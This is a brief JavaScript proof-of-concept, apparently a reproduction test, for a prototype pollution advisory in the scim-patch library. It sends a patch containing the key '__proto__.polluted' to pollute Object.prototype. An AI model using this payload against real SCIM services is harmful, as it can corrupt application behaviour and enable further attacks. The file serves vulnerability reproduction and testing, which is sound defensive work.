// scim-patch <= 0.9.0 (GHSA-9m6g-wc8r-q59c): a key like "__proto__.polluted" in the value of an add/replace
// operation is split on "." and walked into Object.prototype. Written by hand from the advisory text.
const { scimPatch } = require(TARGET_DIR);

const user = {
  schemas: ['urn:ietf:params:scim:schemas:core:2.0:User'],
  id: 'u1',
  userName: 'spiderman',
  name: { familyName: 'Parker', givenName: 'Peter' },
  active: true,
  emails: [{ value: 'spiderman@example.com', primary: true }],
  roles: [],
  meta: { resourceType: 'User', created: 'x', lastModified: 'x', location: 'x' },
};

scimPatch(user, [{ op: 'add', value: JSON.parse('{"__proto__.polluted": "yes"}') }]);
